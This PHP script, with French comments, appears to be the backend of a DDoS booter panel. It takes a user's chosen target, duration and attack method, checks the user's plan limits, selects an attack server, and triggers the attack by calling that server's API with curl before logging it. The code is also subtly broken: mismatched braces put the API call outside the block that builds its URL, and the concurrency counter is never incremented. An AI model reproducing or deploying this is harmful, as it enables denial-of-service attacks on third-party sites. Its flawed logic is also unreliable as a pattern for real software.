<?php

session_start();

require_once("../include/bdd.php");

if(isset($_SESSION['id'])){
	if(isset($_POST['target']) && isset($_POST['time']) && isset($_POST['methode'])){
		$getUser=$pdo->prepare("SELECT * FROM `users` WHERE `id`=?");
		$getUser->execute(array($_SESSION['id']));
		$userInfo=$getUser->fetch();
		
		$maxAttacks=$userInfo['concurrents'];
		$maxTime=$userInfo['secondes'];
		
		if($_POST['time'] <= $maxTime){
			$getAttacks=$pdo->prepare("SELECT * FROM `attaques` WHERE `userid`=? AND `statut`=0 AND `timestamp_end`>?");
			$getAttacks->execute(array($_SESSION['id'], time()));
			if($getAttacks->rowCount() < $maxAttacks){
				$getServer=$pdo->prepare("SELECT * FROM `servers` WHERE `type`=7 AND `methodes` LIKE ? AND `statut`=1");
				$getServer->execute(array("%".$_POST['methode']."%"));
				if($getServer->rowCount() != 0){
					$found=false; //On part du principe qu'aucun serveur n'est disponnible
					while($serv=$getServer->fetch()){
						if($found == false){
							if($serv['active_concurent'] < $serv['max_concurent']){
								$found=true; //On a un serveur de dispo donc on effectue la requête api
								$apiurl=$serv['api'];
								$apiurl=str_replace("[host]",$_POST['target'],$apiurl);
								$apiurl=str_replace("[time]",$_POST['time']-5,$apiurl);
								$apiurl=str_replace("[port]",80,$apiurl);
								$apiurl=str_replace("[method]",$_POST['methode'],$apiurl);
								
								$newConcurent=$serv['active_concurent']; //Nouveau nb d'attaque en cours
								
								$updateServer=$pdo->prepare("UPDATE `servers` SET `active_concurent`=? WHERE `id`=?");
								$updateServer->execute(array($newConcurent,$serv['id'])); //On update le nb d'attaque en cours sur le serveur
								
								
								$timestamp=time();
								$timestampEnd=$timestamp+$_POST['time'];
								
								$addAttack=$pdo->prepare("INSERT INTO `attaques`(`server`, `type`, `userid`, `username`, `target`, `methode`, `duree`, `date`, `timestamp`, `timestamp_end`) VALUES (?,?,?,?,?,?,?,?,?,?)");
								$addAttack->execute(array($serv['id'], 7, $_SESSION['id'], $_SESSION['username'], $_POST['target'], $_POST['methode'],$_POST['time'], date("d-m-Y à H:i:s"), $timestamp, $timestampEnd)); //Ajout du log d'attaque dans la table d'attaque
							
									
									//PS: On a du d'abord insérer le log dans la table attaque afin de get son ID dans la BDD pour pouvoir par la suite modifier sa valeur
									//content qui contiendra le processID de l'attaque (ce qui permettra à l'utilisateur de stopper son attaque)
									//Ceci n'est nécessaire que pour la méthode BYPASS-NOODER
								}
								
								//Envoi vers l'api
									$curl = curl_init();

									curl_setopt_array($curl, array(
										CURLOPT_RETURNTRANSFER => true,
										CURLOPT_URL => $apiurl,
										CURLOPT_CUSTOMREQUEST => "GET"
									));

									$response = curl_exec($curl);

									curl_close($curl);
								//Fin de la requête
								
								if($response == "success"){
									$addLog=$pdo->prepare("INSERT INTO `logs`(`action`, `userid`, `username`, `date`, `content`) VALUES (?,?,?,?,?)");
									$logContent=json_encode(array("cible" => $_POST['target'], "duree" => $_POST['time'], "serveur" => $serv['id'], "methode" => $_POST['methode']));
									$addLog->execute(array("attaque", $_SESSION['id'], $_SESSION['username'], date("d-m-Y à H:i:s"), $logContent)); //Ajout du log dans la table logs
									
									echo "success"; //On retourne un code d'erreur bon
									exit();
								} else {
									
									echo "apierror : ".$response;
									exit();
								}
							}
						}
					}
					if($found==false){ //Si après la boucle qui check tous les serveurs, aucun n'est dispo, on retourne l'erreur 'noserver'
						echo "noserver";
					}
				} else {
					echo "noserver";
				}
			} else {
				echo "maxconcurent";
			}
		} else {
			echo "maxtime";
		}
	}
 else {
	echo "not login";
}


?>